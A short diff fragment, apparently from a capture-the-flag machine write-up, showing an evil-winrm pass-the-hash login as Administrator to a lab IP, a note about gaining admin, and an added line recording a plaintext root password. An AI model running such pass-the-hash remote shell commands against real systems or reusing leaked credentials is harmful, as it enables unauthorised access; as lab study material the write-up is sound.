@@ -351,3 +351,6 @@ evil-winrm --ip 10.10.11.51 -u Administrator -H '7a8d4e[snip]60f75e5a0b3ff'
 * Now we are admin:
   ![Pasted image 20250220160118.png](../../../../assets/Pasted%20image%2020250220160118.png)
 
+
+
+Root:MyLittlePony69!
